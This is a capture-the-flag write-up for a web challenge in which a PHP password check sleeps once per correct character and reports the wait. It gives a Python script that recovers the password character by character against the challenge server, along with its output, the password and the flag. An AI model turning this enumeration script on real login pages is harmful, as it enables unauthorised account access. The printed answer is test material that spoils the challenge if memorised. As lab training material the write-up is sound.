# Challenge Name: Side Channel


![date](https://img.shields.io/badge/date-14.03.2022-brightgreen.svg)  
![solved after CTF](https://img.shields.io/badge/solved-after%20CTF-red.svg)       
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-35-blue.svg)  

## Description

Created By **m4rc0s**

Now, some interesting bugs …

Every so often, you can find some bugs in the logic of the code, and occasionally, you can use time to extract the password.

**Code**

```php
  $password  = $_POST['password'];
    for ($i = 0; $i < min(strlen($real_password),strlen($password)); $i+=1) 
    {
        if($password[$i] == $real_password[$i]) 
        {
            $cpt++;
            sleep(1);
        }
        else 
        break;
    }
    if($cpt == strlen($real_password)) echo $FLAG;
    else echo "Incorrect Password, and you waited $cpt seconds";  
```

> Don't try brute-force

> You can solve the challenge manually or by using a script

> You can search Side Channel Attacks

http://18.132.195.71

[Acces to WebSite](http://18.132.195.71/)

## Detailed solution

Looking at the code we can see a for loop analyzing our input to compare it with password elements. 

```php
  $password  = $_POST['password'];
    for ($i = 0; $i < min(strlen($real_password),strlen($password)); $i+=1) 
    {
        if($password[$i] == $real_password[$i]) 
        {
            $cpt++;
            sleep(1);
        }
        else 
        break;
    }
    if($cpt == strlen($real_password)) echo $FLAG;
    else echo "Incorrect Password, and you waited $cpt seconds";  
```

- if we test a wrong charactere the page will return "you waited **0** seconds" 
  
![image](https://user-images.githubusercontent.com/72421091/158093241-993539d9-0216-4830-94a6-97161d45d961.png)

- if we have only one charactere right the page will return "you waited **1** seconds"

![image](https://user-images.githubusercontent.com/72421091/158093294-2b5d36de-301a-4906-b3ec-6ed2443a6658.png)

- after each charactere we found, the page will return you waited **X** seconds" with X equal to the size of our right input until the last charactere wich will return the **$FLAG**  

I created a python script to find the characters used in the password one by one. The funny thing i didn't known what's wrong for days until i realize that i forgot to add the  flag test cas :disappointed_relieved:

```python
import requests, string
from requests.structures import CaseInsensitiveDict

url = "http://18.132.195.71/"

headers = CaseInsensitiveDict()

headers["Connection"] = "keep-alive"
headers["Cache-Control"] = "max-age=0"
headers["Upgrade-Insecure-Requests"] = "1"
headers["Origin"] = "http://18.132.195.71"
headers["Content-Type"] = "application/x-www-form-urlencoded"
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
headers["Referer"] = "http://18.132.195.71/"
headers["Accept-Language"] = "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7"

t = 1
flag = ""

while(True):    
    for s in string.printable:
        tit = flag + s
        data = F"password={tit}"
        resp = requests.post(url, headers=headers, data=data)
        page = resp.content.decode("utf-8")
        if page.find(F"{t} seconds") != -1:
            flag += s
            print(flag)
            t = t+1
            break
        elif s == string.printable[-1]:
            print("Not found")
            exit()
        elif page.find("CRISIS{") != -1:
            flag += s
            print(F"the password is {flag}")
            print(page)
            exit()
```

Output

```
w
we
web
webs
webse
the password is websec
<html>
    <head>
       <meta charset="utf-8">
        <link rel="stylesheet" href="style.css" media="screen" type="text/css" />
    </head>
    <body>
        <div id="container">            
            <form action="" method="POST">
                <h3 class="text-center">Insert your Password</h3>
                
                <input type="text" placeholder="Enter the password" id=password name="password" required>

                <input type="submit" value="Submit">
            
            </form>
        </div>
    </body>
</html>

CRISIS{1c93286e3}
```
![image](https://user-images.githubusercontent.com/72421091/158093187-e2639b55-1627-41e5-8c81-5b031b395dc5.png)

## Flag

```
CRISIS{1c93286e3}
```


